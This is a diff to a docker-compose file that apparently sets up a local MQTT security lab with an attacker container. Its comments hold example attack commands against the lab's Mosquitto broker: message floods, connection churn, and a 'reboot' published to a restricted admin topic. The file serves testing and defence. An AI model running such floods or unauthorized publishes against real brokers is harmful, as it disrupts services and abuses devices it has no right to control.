@@ -40,7 +40,7 @@ services:
       sh -c 'sleep 3;
       echo "Attacker ready. Run: docker exec -it attacker sh";
       tail -f /dev/null'
-    # Attack 1: burst flood
-    # docker exec -it attacker sh -c 'for i in $(seq 1 300); do mosquitto_pub -h mosquitto -t "attack/flood" -m "x$i" -i attacker1; done'
-    # Attack 2: publish to restricted topic
-    # docker exec -it attacker sh -c 'mosquitto_pub -h mosquitto -t "admin/commands" -m "reboot" -i attacker1'
+    # Attack A: Connection churn
+    # docker exec -it attacker sh -c "i=1; while [ $i -le 50 ]; do mosquitto_pub -h mosquitto -t attack/churn -m x$i -i attacker1; i=$((i+1)); done"
+    # Attack B: Message-rate flood
+    # docker exec -it attacker sh -c "i=1; while [ $i -le 200 ]; do echo x$i; i=$((i+1)); done | mosquitto_pub -h mosquitto -t attack/msgflood -l -i attacker_persist"
